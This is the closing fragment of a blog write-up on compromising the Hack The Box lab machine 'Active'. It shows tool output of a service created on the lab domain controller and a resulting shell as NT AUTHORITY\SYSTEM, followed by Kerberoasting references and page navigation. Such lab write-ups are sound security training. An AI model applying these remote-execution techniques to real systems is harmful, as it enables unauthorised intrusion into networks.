</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Creating</span> <span class=nx>service</span> <span class=nx>EiEB</span> <span class=nx>on</span> <span class=nx>dc</span><span class=p>.</span><span class=nx>active</span><span class=p>.</span><span class=nx>htb</span><span class=p>.....</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>*</span><span class=p>]</span> <span class=nx>Starting</span> <span class=nx>service</span> <span class=nx>EiEB</span><span class=p>.....</span>
</span></span><span class=line><span class=cl><span class=p>[</span><span class=o>!</span><span class=p>]</span> <span class=nx>Press</span> <span class=nx>help</span> <span class=k>for</span> <span class=nx>extra</span> <span class=nx>shell</span> <span class=nx>commands</span>
</span></span><span class=line><span class=cl><span class=nx>Microsoft</span> <span class=nx>Windows</span> <span class=p>[</span><span class=nx>Version</span> <span class=mf>6.1.7601</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=nx>Copyright</span> <span class=p>(</span><span class=nx>c</span><span class=p>)</span> <span class=mi>2009</span> <span class=nx>Microsoft</span> <span class=nx>Corporation</span><span class=p>.</span>  <span class=nx>All</span> <span class=nx>rights</span> <span class=nx>reserved</span><span class=p>.</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>C</span><span class=o>:</span><span class=err>\</span><span class=nx>Windows</span><span class=err>\</span><span class=nx>system32</span><span class=o>&gt;</span> <span class=nx>whoami</span>
</span></span><span class=line><span class=cl><span class=nx>nt</span> <span class=nx>authority</span><span class=err>\</span><span class=nx>system</span>
</span></span></code></pre></div><h3 id=references>References<a hidden class=anchor aria-hidden=true href=#references>#</a></h3><p><a href=https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast>https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast</a></p><p><a href="https://adsecurity.org/?p=2288">https://adsecurity.org/?p=2288</a></p></div><footer class=post-footer><ul class=post-tags><li><a href=//localhost:1313/tags/windows/>Windows</a></li><li><a href=//localhost:1313/tags/ad/>AD</a></li><li><a href=//localhost:1313/tags/gpp/>GPP</a></li></ul><nav class=paginav><a class=prev href=//localhost:1313/posts/interface/><span class=title>« Prev</span><br><span>Beyond the Interface: Escalating with a Bash Operator Flaw</span>
</a><a class=next href=//localhost:1313/posts/pc/><span class=title>Next »</span><br><span>From gRPC SQLi to Pyload Root: A Guide to HTB 'PC'</span></a></nav><ul class=share-buttons><li><a target=_blank rel="noopener noreferrer" aria-label="share From GPP to Domain Admin: Cracking HTB 'Active' on x" href="https://x.com/intent/tweet/?text=From%20GPP%20to%20Domain%20Admin%3a%20Cracking%20HTB%20%27Active%27&amp;url=%2f%2flocalhost%3a1313%2fposts%2factive%2f&amp;hashtags=windows%2cAD%2cGPP"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446C483.971.0 512 28.03 512 62.554zM269.951 190.75 182.567 75.216H56L207.216 272.95 63.9 436.783h61.366L235.9 310.383l96.667 126.4H456L298.367 228.367l134-153.151H371.033zM127.633 110h36.468l219.38 290.065H349.5z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share From GPP to Domain Admin: Cracking HTB 'Active' on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&amp;url=%2f%2flocalhost%3a1313%2fposts%2factive%2f&amp;title=From%20GPP%20to%20Domain%20Admin%3a%20Cracking%20HTB%20%27Active%27&amp;summary=From%20GPP%20to%20Domain%20Admin%3a%20Cracking%20HTB%20%27Active%27&amp;source=%2f%2flocalhost%3a1313%2fposts%2factive%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share From GPP to Domain Admin: Cracking HTB 'Active' on reddit" href="https://reddit.com/submit?url=%2f%2flocalhost%3a1313%2fposts%2factive%2f&title=From%20GPP%20to%20Domain%20Admin%3a%20Cracking%20HTB%20%27Active%27"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share From GPP to Domain Admin: Cracking HTB 'Active' on facebook" href="https://facebook.com/sharer/sharer.php?u=%2f%2flocalhost%3a1313%2fposts%2factive%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share From GPP to Domain Admin: Cracking HTB 'Active' on whatsapp" href="https://api.whatsapp.com/send?text=From%20GPP%20to%20Domain%20Admin%3a%20Cracking%20HTB%20%27Active%27%20-%20%2f%2flocalhost%3a1313%2fposts%2factive%2f"><svg viewBox="0 0 512 512" height="30" width="30" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share From GPP to Domain Admin: Cracking HTB 'Active' on telegram" href="https://telegram.me/share/url?text=From%20GPP%20to%20Domain%20Admin%3a%20Cracking%20HTB%20%27Active%27&amp;url=%2f%2flocalhost%3a1313%2fposts%2factive%2f"><svg viewBox="2 2 28 28" height="30" width="30" fill="currentColor"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></li><li><a target=_blank rel="noopener noreferrer" aria-label="share From GPP to Domain Admin: Cracking HTB 'Active' on ycombinator" href="https://news.ycombinator.com/submitlink?t=From%20GPP%20to%20Domain%20Admin%3a%20Cracking%20HTB%20%27Active%27&u=%2f%2flocalhost%3a1313%2fposts%2factive%2f"><svg width="30" height="30" viewBox="0 0 512 512" fill="currentColor"><path d="M449.446.0C483.971.0 512 28.03 512 62.554V449.446C512 483.97 483.97 512 449.446 512H62.554C28.03 512 0 483.97.0 449.446V62.554C0 28.03 28.029.0 62.554.0H449.446zM183.8767 87.9921h-62.034L230.6673 292.4508V424.0079h50.6655V292.4508L390.1575 87.9921H328.1233L256 238.2489z"/></svg></a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=//localhost:1313/>Fieryrival's Blog</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");if(menu){const e=localStorage.getItem("menu-scroll-position");e&&(menu.scrollLeft=parseInt(e,10)),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}}document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{const e=document.querySelector("html");e.dataset.theme==="dark"?(e.dataset.theme="light",localStorage.setItem("pref-theme","light")):(e.dataset.theme="dark",localStorage.setItem("pref-theme","dark"))})</script></body></html>